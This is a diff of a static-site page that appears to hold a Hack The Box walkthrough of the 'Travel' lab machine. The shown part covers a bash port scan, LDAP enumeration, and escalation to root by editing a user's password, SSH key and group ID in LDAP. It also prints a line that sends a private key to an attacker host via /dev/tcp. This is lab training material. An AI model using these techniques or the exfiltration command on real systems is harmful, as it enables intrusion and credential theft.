+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">for</span> port in <span class="o">{</span>1..65535<span class="o">}</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> &gt; /dev/tcp/172.20.0.10/<span class="nv">$port</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$port</span><span class="s2"> open&#34;</span><span class="p">;</span> <span class="k">done</span> 2&gt;/dev/null
+</span></span></code></pre></div><ul>
 <li>Actually there is another port open which is <code>639</code> along with <code>389</code></li>
 <li>First lemme forward the port 389 to my system.</li>
 </ul>
-<pre tabindex="0"><code>ssh -L 389:172.20.0.10:389 lynik-admin@travel.htb
-</code></pre><ul>
-<li>The password from <code>.viminfo</code> actually works</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -L 389:172.20.0.10:389 lynik-admin@travel.htb
+</span></span></code></pre></div><ul>
+<li>The password from <code>.viminfo</code> actually worked here</li>
 </ul>
-<pre tabindex="0"><code>ldapsearch -H ldap://127.0.0.1  -w &lt;SNIP&gt; -b &#34;DC=travel,DC=htb&#34; -D &#39;CN=lynik-admin,DC=travel,dc=htb&#39;
-</code></pre><ul>
-<li>![[Pasted image 20250228170736.png]]</li>
-<li>This user actually is a admin to LDAP which will help a lot</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -H ldap://127.0.0.1  -w &lt;SNIP&gt; -b <span class="s2">&#34;DC=travel,DC=htb&#34;</span> -D <span class="s1">&#39;CN=lynik-admin,DC=travel,dc=htb&#39;</span>
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228170736.png?raw=true" alt="Pasted image 20250228170736.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>This user actually a admin to LDAP which will help a lot</li>
 <li>The PAM configuration for su reveals something. Location of the file: <code>/etc/pam.d/su</code></li>
 </ul>
 <pre tabindex="0"><code>#
@@ -1797,39 +2095,124 @@ session    required   pam_limits.so
 @include common-account
 @include common-session
 </code></pre><ul>
+<li>Before moving onto next, make a LDAP connection with <a href="https://directory.apache.org/studio/" target="_blank">Apache Directory Studio</a> to make any process easy</li>
 <li>The configuration allows only the members of wheel group to switch to other users. Attempts to SSH as this user also fail, as the server denies password-based authentication.</li>
-<li>The ssh configuration file also gives us more details regarding this. <code>/etc/ssh/ssh_config</code> and`/etc/ssh/sshd_config</li>
-<li>The sss_ssh_authorizedkeys utility retrieves user public keys from the specified domain. According to the documentation, SSH public keys can be stored in the sshPublicKey attribute in LDAP</li>
-<li>Lets try changing the password of user <code>lynik</code> to password of our choice</li>
-<li>Click on new Attribute and type <code>userPassword</code> then click finish after that a dialogue box will prompt asking for new password. Enter the password, click finish.</li>
-<li>![[Pasted image 20250301003838.png]]</li>
-<li>I can see the commands used for this, below.</li>
-<li>![[Pasted image 20250301003943.png]]</li>
-<li>To login as user <code>lynik</code> I have to put the public key via LDAP</li>
-<li>Now to login using ssh I created keys using <code>ssh-keygen</code> and then copied the public key.</li>
-<li>![[Pasted image 20250301005213.png]]</li>
+<li>The ssh configuration file also gives us more details regarding this. (Ref: <code>/etc/ssh/ssh_config</code> and <code>/etc/ssh/sshd_config</code>)</li>
+<li>The sss_ssh_authorizedkeys utility retrieves user public keys from the specified domain. According to the documentation, SSH public keys can be stored in the sshPublicKey attribute on LDAP</li>
+<li>Lets try changing the password for user <code>lynik</code> to password of our choice</li>
+<li>Click on new Attribute and type <code>userPassword</code> then click finish after that a dialogue box will prompt asking for new password. Enter the password, click finish.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301003838.png?raw=true" alt="Pasted image 20250301003838.png" />
+    
+  </figure>
+</li>
+<li>I can see the commands used in the background for this, below.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301003943.png?raw=true" alt="Pasted image 20250301003943.png" />
+    
+  </figure>
+</li>
+<li>To login as user <code>lynik</code> I have to put the public key to the system via LDAP</li>
+<li>Now to login using ssh I created keys using <code>ssh-keygen</code> and then copied the public key.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301005213.png?raw=true" alt="Pasted image 20250301005213.png" />
+    
+  </figure>
+</li>
 <li>In Apache directory studio create new attribute <code>objectClass</code> and the click finish</li>
 <li>Then on the prompt select <code>ldapPublickey</code>, click finish after selecting it.</li>
-<li>Create another attribute <code>sshPublickey</code> then on the prompt click &ldquo;edit as text&rdquo;, after paste the public key. Click finish.</li>
+<li>Create another attribute <code>sshPublickey</code> then on the prompt click <code>&quot;edit as text&quot;</code>, after paste the public key. Click finish.</li>
 <li>Transferred the private key to my system.</li>
 </ul>
-<pre tabindex="0"><code>cat id_rsa &gt; /dev/tcp/10.10.14.16/8001
-</code></pre><ul>
-<li>After giving necessary permissions, using that to login as user <code>lynik</code></li>
-<li>I can see user <code>lynik</code> group is <code>5000</code></li>
-<li>![[Pasted image 20250301010405.png]]</li>
-<li>I can actually change the group to root group. But first I have to find the UID for root group</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat id_rsa &gt; /dev/tcp/10.10.14.16/8001
+</span></span></code></pre></div><ul>
+<li>After giving all the necessary permissions, used the private key to login as user <code>lynik</code></li>
+<li>I can see user <code>lynik</code> group is in <code>5000</code>
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301010405.png?raw=true" alt="Pasted image 20250301010405.png" />
+    
+  </figure>
+</li>
+<li>I can actually change the group to root&rsquo;s group. But first I have to find the UID for root group</li>
 </ul>
-<pre tabindex="0"><code>cat /etc/group | grep -i sudo
-</code></pre><ul>
-<li>![[Pasted image 20250301010513.png]]</li>
-<li>Found root group to be <code>27</code> so changed the group ID to <code>27</code> in the LDAP.</li>
-<li>![[Pasted image 20250301010953.png]]</li>
-<li>After re-login I can see the changes</li>
-<li>![[Pasted image 20250301011035.png]]</li>
-<li>Got the root flag.</li>
-<li>![[Pasted image 20250301011304.png]]</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /etc/group <span class="p">|</span> grep -i sudo
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301010513.png?raw=true" alt="Pasted image 20250301010513.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>Found root group to be <code>27</code> so changed the group ID to <code>27</code> in the LDAP.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301010953.png?raw=true" alt="Pasted image 20250301010953.png" />
+    
+  </figure>
+</li>
+<li>After re-login I can see the changes
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301011035.png?raw=true" alt="Pasted image 20250301011035.png" />
+    
+  </figure>
+</li>
+<li>Got the 
+<div class="flex mt-2">
+<span
+  class="rounded-full bg-primary-500 dark:bg-primary-400 text-neutral-50 dark:text-neutral-800 px-1.5 py-[1px] text-xs font-normal"
+>
+  <span class="flex flex-row items-center">
+    
+    <span>Root flag</span>
+  </span>
+</span>
+</div>
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301011304.png?raw=true" alt="Pasted image 20250301011304.png" />
+    
+  </figure>
+</li>
 </ul>
+
+
+<h2 class="relative group">Summary 
+    <div id="summary" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#summary" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>This walkthrough details the full compromise of travel.htb, a Linux-based target. Reconnaissance revealed open ports (22, 80, 443), a WordPress site (blog.travel.htb), and an exposed .git directory. Enumeration uncovered an outdated WordPress 5.4 installation with XML-RPC enabled and a vulnerable rss_template.php file. Exploiting an SSRF vulnerability, cache poisoning in Memcached, and PHP object injection, a web shell was uploaded, leading to remote code execution. Pivoting further, a MySQL database dump exposed credentials, and an .ldaprc file hinted at LDAP-based authentication. Using .viminfo, a stored password was retrieved, granting access to lynik-admin via SSH. By modifying LDAP attributes, the user’s group was changed to root (27), escalating privileges and leading to complete system takeover. This successful attack leveraged SSRF, cache poisoning, and LDAP misconfigurations to achieve root access and capture the final flag.</p>
+<div id="typeit-156d755fa06f6b92f368c705072e09f1"></div>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+      new TypeIt("#typeit-156d755fa06f6b92f368c705072e09f1", {
+        strings: [" I am not going to lie this one of the logest box that I have ever encountered. Apart from that this was good, This is machine geve me pure statisfaction. As always i'll see you on another walkthrough "],
+        speed:  100 ,
+        lifeLike:  false ,
+        startDelay:  0 ,
+        breakLines:  true ,
+        waitUntilVisible:  true ,
+        loop:  false 
+      }).go();
+    });
+</script>
+<p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media.tenor.com/EtD1uTCJ_3sAAAAi/no-bye.gif" alt="see-you" />
+    
+  </figure>
+</p>
 
           
           
@@ -1847,7 +2230,7 @@ session    required   pam_limits.so
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/Secure-The-Throne/posts/1742495331851-travel-walkthroughhtb/&amp;title=Travel%20Walkthrough%28HTB%29"
+      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/posts/1742495331851-travel-walkthroughhtb/&amp;title=Travel%20Walkthrough%28Hack%20The%20Box%29"
       title="Share on LinkedIn"
       aria-label="Share on LinkedIn"
       >
@@ -1866,7 +2249,7 @@ session    required   pam_limits.so
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://twitter.com/intent/tweet/?url=http://localhost:1313/Secure-The-Throne/posts/1742495331851-travel-walkthroughhtb/&amp;text=Travel%20Walkthrough%28HTB%29"
+      href="https://twitter.com/intent/tweet/?url=http://localhost:1313/posts/1742495331851-travel-walkthroughhtb/&amp;text=Travel%20Walkthrough%28Hack%20The%20Box%29"
       title="Tweet on Twitter"
       aria-label="Tweet on Twitter"
       >
@@ -1884,7 +2267,7 @@ session    required   pam_limits.so
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://api.whatsapp.com/send?text=http://localhost:1313/Secure-The-Throne/posts/1742495331851-travel-walkthroughhtb/&amp;resubmit=true&amp;title=Travel%20Walkthrough%28HTB%29"
+      href="https://api.whatsapp.com/send?text=http://localhost:1313/posts/1742495331851-travel-walkthroughhtb/&amp;resubmit=true&amp;title=Travel%20Walkthrough%28Hack%20The%20Box%29"
       title="Share via WhatsApp"
       aria-label="Share via WhatsApp"
       >
@@ -1903,7 +2286,7 @@ session    required   pam_limits.so
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://pinterest.com/pin/create/bookmarklet/?url=http://localhost:1313/Secure-The-Throne/posts/1742495331851-travel-walkthroughhtb/&amp;description=Travel%20Walkthrough%28HTB%29"
+      href="https://pinterest.com/pin/create/bookmarklet/?url=http://localhost:1313/posts/1742495331851-travel-walkthroughhtb/&amp;description=Travel%20Walkthrough%28Hack%20The%20Box%29"
       title="Pin on Pinterest"
       aria-label="Pin on Pinterest"
       >
@@ -1922,7 +2305,7 @@ session    required   pam_limits.so
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://reddit.com/submit/?url=http://localhost:1313/Secure-The-Throne/posts/1742495331851-travel-walkthroughhtb/&amp;resubmit=true&amp;title=Travel%20Walkthrough%28HTB%29"
+      href="https://reddit.com/submit/?url=http://localhost:1313/posts/1742495331851-travel-walkthroughhtb/&amp;resubmit=true&amp;title=Travel%20Walkthrough%28Hack%20The%20Box%29"
       title="Submit to Reddit"
       aria-label="Submit to Reddit"
       >
@@ -1941,7 +2324,7 @@ session    required   pam_limits.so
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/Secure-The-Throne/posts/1742495331851-travel-walkthroughhtb/&amp;quote=Travel%20Walkthrough%28HTB%29"
+      href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/posts/1742495331851-travel-walkthroughhtb/&amp;quote=Travel%20Walkthrough%28Hack%20The%20Box%29"
       title="Share on Facebook"
       aria-label="Share on Facebook"
       >
@@ -1960,7 +2343,7 @@ session    required   pam_limits.so
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="mailto:?body=http://localhost:1313/Secure-The-Throne/posts/1742495331851-travel-walkthroughhtb/&amp;subject=Travel%20Walkthrough%28HTB%29"
+      href="mailto:?body=http://localhost:1313/posts/1742495331851-travel-walkthroughhtb/&amp;subject=Travel%20Walkthrough%28Hack%20The%20Box%29"
       title="Send via email"
       aria-label="Send via email"
       >
@@ -1978,7 +2361,513 @@ session    required   pam_limits.so
   </section>
 
 
+        
+
+
+<h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
+<section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
+  
+  
+
+  <a href="/posts/1742495783286-alert-walkthroughhtb/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/1742495783286-alert-walkthroughhtb/featured_hu_fe1c5a0c349e65dd.jpeg);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/1742495783286-alert-walkthroughhtb/">Alert Walkthrough(Hack The Box)</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
           
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-03-22T00:00:00&#43;00:00">22 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>824 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/easy/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Easy
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/linux/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Linux
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hack-the-box/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Hack the Box
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hacking/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Hacking
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Web
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/walkthrough/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Walkthrough
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+        </div>
+
+        
+        <div class="py-1 prose dark:prose-invert">
+          
+        </div>
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+  
+  
+
+  <a href="/posts/1742061149402-jarmis-walkthroughhtb/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/1742061149402-jarmis-walkthroughhtb/featured_hu_ae273af3970d77f5.jpeg);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/1742061149402-jarmis-walkthroughhtb/">Jarmis Walkthrough(Hack The Box)</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-03-20T00:00:00&#43;00:00">20 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>3421 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">17 mins</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hard/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Hard
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/linux/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Linux
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hack-the-box/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Hack the Box
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hacking/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Hacking
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Web
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/walkthrough/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Walkthrough
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+        </div>
+
+        
+        <div class="py-1 prose dark:prose-invert">
+          
+        </div>
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+  
+  
+
+  <a href="/posts/1741809498520-union-walkthroughhtb/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/1741809498520-union-walkthroughhtb/featured_hu_3ed7bc6f71332e39.jpeg);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/1741809498520-union-walkthroughhtb/">Union Walkthrough(Hack The Box)</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-03-16T00:00:00&#43;00:00">16 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>934 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/medium/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Medium
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/linux/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Linux
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hack-the-box/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Hack the Box
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hacking/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Hacking
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Web
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/walkthrough/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Walkthrough
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+        </div>
+
+        
+        <div class="py-1 prose dark:prose-invert">
+          
+        </div>
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+  
+</section>
+
+  
       </div>
      
       
@@ -1994,7 +2883,7 @@ session    required   pam_limits.so
       </script>
       
       
-      <script type="text/javascript" src="/Secure-The-Throne/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js" integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q&#43;oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script>
+      <script type="text/javascript" src="/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js" integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q&#43;oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script>
       
   
     </section>
@@ -2010,7 +2899,7 @@ session    required   pam_limits.so
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/Secure-The-Throne/posts/1741895312886-support-walkthroughhtb/">
+            <a class="flex group mr-3" href="/posts/1742495783286-alert-walkthroughhtb/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -2022,11 +2911,11 @@ session    required   pam_limits.so
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Support Walkthrough(HTB)</span
+                  >Alert Walkthrough(Hack The Box)</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-03-18T00:00:00&#43;00:00">18 March 2025</time>
+                    <time datetime="2025-03-22T00:00:00&#43;00:00">22 March 2025</time>
                   
                 </span>
               </span>
@@ -2035,15 +2924,15 @@ session    required   pam_limits.so
         </span>
         <span>
           
-            <a class="flex text-right group ml-3" href="/Secure-The-Throne/posts/1742496891311-sightless-walkthroughhtb/">
+            <a class="flex text-right group ml-3" href="/posts/1742232333948-secnotes-walkthroughhtb/">
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Sightless Walkthrough(HTB)</span
+                  >SecNotes Walkthrough(Hack The Box)</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-03-20T00:00:00&#43;00:00">20 March 2025</time>
+                    <time datetime="2025-03-24T00:00:00&#43;00:00">24 March 2025</time>
                   
                 </span>
               </span>
@@ -2085,14 +2974,6 @@ session    required   pam_limits.so
           <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=""
             title="">
             
-            Under Development
-          </a>
-        </li>
-        
-        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
-          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=""
-            title="">
-            
             
           </a>
         </li>
@@ -2127,14 +3008,14 @@ session    required   pam_limits.so
   </script>
   
   
